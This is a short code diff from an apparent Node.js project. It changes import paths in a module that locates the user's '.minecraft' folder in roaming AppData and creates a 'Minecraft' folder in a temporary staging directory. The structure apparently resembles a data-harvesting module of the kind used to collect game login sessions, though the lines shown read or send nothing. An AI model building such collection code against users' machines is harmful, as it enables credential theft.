@@ -1,7 +1,7 @@
-const { paths: { roamingAppData } } = require('../variables');
+const { paths: { roamingAppData } } = require('../util/variables');
 const { join } = require('path');
 const fs = require('fs');
-const { tempFolder } = require('../../index');
+const { tempFolder } = require('../index');
 
 const path = join(roamingAppData, '.minecraft');
 fs.mkdirSync(join(tempFolder, 'Minecraft'));
